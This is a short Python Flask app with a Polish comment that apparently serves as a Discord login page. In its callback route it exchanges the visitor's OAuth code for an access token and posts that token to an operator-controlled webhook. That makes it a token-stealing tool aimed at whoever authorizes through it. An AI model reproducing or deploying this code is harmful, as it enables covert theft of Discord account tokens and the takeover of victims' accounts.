from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if code:
        # Wymiana kodu na token
        data = {
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://discord.com/oauth2/authorize"
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post("https://discord.com/api/v9/oauth2/token", data=data, headers=headers)
        
        if response.status_code == 200:
            token = response.json().get("access_token")
            if token and WEBHOOK_URL:
                requests.post(WEBHOOK_URL, json={"content": f"**🎯 Token:** `{token}`"})
    
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
